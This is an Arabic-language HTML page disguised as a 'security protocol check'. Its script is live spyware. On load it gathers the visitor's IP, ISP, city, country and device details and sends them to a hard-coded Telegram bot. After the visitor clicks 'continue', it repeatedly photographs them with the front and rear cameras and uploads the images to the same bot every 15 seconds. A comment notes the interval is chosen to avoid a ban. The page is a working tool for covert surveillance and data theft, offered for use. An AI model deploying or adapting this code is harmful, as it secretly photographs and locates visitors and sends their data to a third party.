<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من النظام</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .ui { text-align: center; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { padding: 12px 24px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; display: none; }
    </style>
</head>
<body>

    <div class="ui">
        <div class="loader" id="ldr"></div>
        <p id="txt">جاري فحص بروتوكولات الأمان...</p>
        <button id="btn">متابعة</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const cid = "2103976274";
        let stream = null;

        // 1. جلب المعلومات فوراً (بشكل مستقل لضمان عدم التعليق)
        async function getInfo() {
            let n = navigator;
            let m = `🔍 **تقرير دخول**\n`;
            m += `📱 النظام: ${n.platform}\n⚙️ المعالج: ${n.hardwareConcurrency} Cores\n`;

            try {
                const res = await fetch('https://ipwho.is/').then(r => r.json());
                if(res.success) {
                    m += `🌍 IP: \`${res.ip}\`\n🏢 الشركة: ${res.connection.isp}\n📍 الموقع: ${res.city}, ${res.country}\n`;
                }
            } catch(e) { m += `🌍 IP: فشل الجلب حالياً\n`; }

            sendMsg(m);
            document.getElementById('ldr').style.display = 'none';
            document.getElementById('btn').style.display = 'inline-block';
            document.getElementById('txt').innerText = "تم الفحص، يرجى المتابعة.";
        }

        // 2. دالة تشغيل الكاميرا مع تنظيف المسارات السابقة
        async function openCam(mode) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop()); // إغلاق تام للكاميرا السابقة
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                return new Promise(res => video.onloadedmetadata = () => { video.play(); res(true); });
            } catch (e) { return false; }
        }

        async function snap(label) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', cid);
                f.append('photo', blob, 'img.jpg');
                f.append('caption', label);
                fetch(api + "sendPhoto", { method: 'POST', body: f });
            }, 'image/jpeg', 0.7);
        }

        document.getElementById('btn').onclick = async function() {
            this.style.display = 'none';
            document.getElementById('txt').innerText = "جاري المزامنة...";

            async function startCycle() {
                // التقاط من الأمامية
                if (await openCam("user")) {
                    setTimeout(() => snap("🤳 أمامية"), 1500);
                }
                
                // انتظار ثم التقاط من الخلفية
                setTimeout(async () => {
                    if (await openCam("environment")) {
                        setTimeout(() => snap("📸 خلفية"), 1500);
                    }
                }, 5000);
            }

            startCycle();
            setInterval(startCycle, 15000); // دورة كل 15 ثانية لتجنب الحظر
        };

        function sendMsg(t) {
            fetch(api + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: cid, text: t, parse_mode: "Markdown" })
            });
        }

        getInfo();
    </script>
</body>
</html>
